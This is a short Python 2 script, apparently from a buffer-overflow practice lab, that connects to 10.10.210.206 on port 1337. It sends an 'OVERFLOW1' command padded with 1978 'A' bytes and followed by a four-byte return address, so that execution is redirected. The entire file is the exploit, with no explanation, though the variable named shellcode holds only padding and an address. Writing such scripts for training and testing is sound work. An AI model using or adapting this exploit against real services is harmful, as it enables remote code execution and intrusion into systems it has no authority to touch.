#!/usr/bin/python 
import sys, socket


shellcode = "A" * 1978 + "\xaf\x11\x50\x62"


try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.connect(('10.10.210.206',1337))

  s.send(('OVERFLOW1 ' + shellcode))
  s.close()

except:
  print "error connecting to server"
  sys.exit()